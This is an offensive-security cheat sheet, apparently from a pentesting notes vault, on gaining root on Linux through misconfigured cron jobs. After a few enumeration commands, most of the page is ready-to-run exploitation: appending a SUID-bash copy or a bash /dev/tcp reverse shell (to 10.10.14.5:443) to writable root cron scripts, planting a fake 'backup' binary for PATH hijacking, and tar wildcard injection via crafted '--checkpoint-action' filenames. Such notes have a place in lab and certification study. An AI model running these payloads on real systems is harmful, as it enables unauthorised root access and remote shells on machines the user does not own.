# 🐧 Cron Jobs

> Scheduled jobs frequently run **as root**. If a root cron executes a **writable script**, uses a **relative path** with a writable PATH dir, or a **wildcard**, you get code execution as root. Use `pspy` to *see* jobs you can't read.

Part of [[Linux Privilege Escalation]]. Related: [[Writable Files & PATH Hijack]] · [[Shells]]

---

## 🧠 THINK
- Enumerate all cron sources; note **who** runs each and **what** it executes.
- **Writable target script?** → drop a reverse shell / SUID bash.
- **Relative path in a root cron + writable PATH dir?** → PATH hijack.
- **Wildcard** (`tar *`, `chown *`, `rsync`)? → wildcard-injection (GTFOBins).
- Can't read crontabs? → **`pspy`** watches processes/cron fire in real time (no root needed).

## ⚡ DETECT
```bash
cat /etc/crontab
```
```bash
ls -la /etc/cron.d /etc/cron.daily /etc/cron.hourly /etc/cron.weekly
```
```bash
crontab -l ; sudo -n crontab -l 2>/dev/null
```
```bash
./pspy64        # watch commands/cron run live — reveals hidden/root jobs
```
**Look for:** a root job running a script you can write to, a bare command name (relative path), or a `*` wildcard on user-controlled files.

## 💥 EXPLOIT
**Writable script run by root cron** — append a payload:
```bash
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /path/to/cron_script.sh
```
```bash
# wait for cron to run, then:
/tmp/rootbash -p
```
Or a reverse shell line:
```bash
echo 'bash -c "bash -i >& /dev/tcp/10.10.14.5/443 0>&1"' >> /path/to/cron_script.sh
```

**Relative-path cron (PATH hijack):** if the cron runs e.g. `backup` (no `/usr/bin/`), and its PATH includes a writable dir:
```bash
echo -e '#!/bin/sh\ncp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > /writable/backup
```
```bash
chmod +x /writable/backup      # cron runs OUR backup as root
```

**Wildcard injection** (e.g. root cron does `tar czf backup.tar.gz *` in a dir you control):
```bash
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > shell.sh
```
```bash
touch -- '--checkpoint=1'; touch -- '--checkpoint-action=exec=sh shell.sh'
```
(tar treats the filenames as options → runs your script as root. Similar tricks exist for `chown`/`rsync`.)

## 🔁 FOUND → NEXT
| FINDING | NEXT |
|---|---|
| Root cron + writable script | append SUID-bash / revshell → wait → root |
| Relative cmd in root cron | PATH hijack → [[Writable Files & PATH Hijack]] |
| Wildcard on your files | tar/chown wildcard injection |
| Can't read crons | run `pspy` to observe them |

## 🚧 FAILED → NEXT
| Problem | Do this |
|---|---|
| No crontab entries visible | run `pspy` — many jobs aren't world-readable |
| Script not writable | check its **directory** perms (rename+replace), or PATH/wildcard angle |
| Job never fires | note the schedule; be patient, or find another vector |
| pspy missing | transfer the static `pspy64` binary ([[Shells]]) |

## 📇 CHEAT SHEET
```bash
cat /etc/crontab ; ls -la /etc/cron.*
```
```bash
./pspy64
```
```bash
echo 'cp /bin/bash /tmp/rb; chmod +s /tmp/rb' >> /path/writable_cron.sh   # wait -> /tmp/rb -p
```
**Kill shot:** root cron → writable script/PATH/wildcard → root.
